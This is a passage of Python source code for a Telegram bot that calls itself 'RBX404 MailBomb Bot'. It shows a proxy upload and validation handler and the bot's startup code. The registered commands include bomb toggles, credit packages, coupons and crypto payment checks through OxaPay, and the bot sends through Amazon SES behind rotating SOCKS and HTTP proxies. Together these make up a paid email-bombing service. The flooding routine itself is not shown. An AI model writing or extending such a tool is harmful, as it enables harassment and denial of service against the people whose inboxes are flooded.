        elif upload_type == "proxy":
            await update.message.reply_text(f"🔍 **Validating {len(lines)} proxies...**\n\nThis may take a minute...")
            
            added = 0
            failed = 0
            errors = []
            
            for line in lines:
                try:
                    # Check if exists
                    existing = db.query(Proxy).filter(Proxy.proxy_string == line).first()
                    if existing:
                        failed += 1
                        errors.append(f"Duplicate: {line[:50]}")
                        continue
                    
                    # VALIDATE PROXY
                    is_valid, error_msg = await validate_proxy(line)
                    
                    if not is_valid:
                        failed += 1
                        errors.append(f"{line[:30]}: {error_msg}")
                        continue
                    
                    # Determine type
                    proxy_type = "http"
                    if "socks5://" in line:
                        proxy_type = "socks5"
                    elif "socks4://" in line:
                        proxy_type = "socks4"
                    
                    # Add proxy
                    proxy = Proxy(
                        proxy_string=line,
                        proxy_type=proxy_type
                    )
                    db.add(proxy)
                    added += 1
                
                except Exception as e:
                    failed += 1
                    errors.append(f"Error: {str(e)[:50]}")
                    continue
            
            db.commit()
            
            result_text = f"""
✅ **Upload Complete!**

✅ Added: {added}
❌ Failed: {failed}

All proxies were VALIDATED!
"""
            
            if errors and len(errors) <= 10:
                result_text += "\n**Errors:**\n"
                for err in errors[:10]:
                    result_text += f"• {err}\n"
            
            await update.message.reply_text(result_text)
            user_sessions.pop(user_id, None)
            return
    
    finally:
        db.close()


# ========== MAIN ==========

def run_bot():
    """Run bot"""
    from telegram.request import HTTPXRequest
    
    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0
    )
    
    app = Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("setlogo", setlogo_cmd))
    app.add_handler(CommandHandler("togglebomb", togglebomb_cmd))
    app.add_handler(CommandHandler("setminbomb", setminbomb_cmd))
    app.add_handler(CommandHandler("createpackage", createpackage_cmd))
    app.add_handler(CommandHandler("createcoupon", createcoupon_cmd))
    app.add_handler(CommandHandler("checkpayment", checkpayment_cmd))
    app.add_handler(CommandHandler("addcredits", addcredits_cmd))
    app.add_handler(CommandHandler("verify", verify_cmd))
    app.add_handler(CommandHandler("referral", referral_info_cmd))
    
    # Callback handler
    app.add_handler(CallbackQueryHandler(button_callback_wrapper))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    
    print("✅ RBX404 MailBomb Bot Started!")
    print(f"📧 Admin IDs: {ADMIN_IDS}")
    print(f"💳 OxaPay: {'✅' if OXAPAY_API_KEY else '❌'}")
    print(f"🌐 SES: {'✅' if USE_SES and SES_AVAILABLE else '❌'}")
    print(f"📢 Channel: {CHANNEL_USERNAME or 'Not set'}")
    print(f"👥 Group: {GROUP_USERNAME or 'Not set'}")
    print("=" * 60)
    
    app.run_polling()

if __name__ == "__main__":
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found in .env!")
        exit(1)
    
    run_bot()
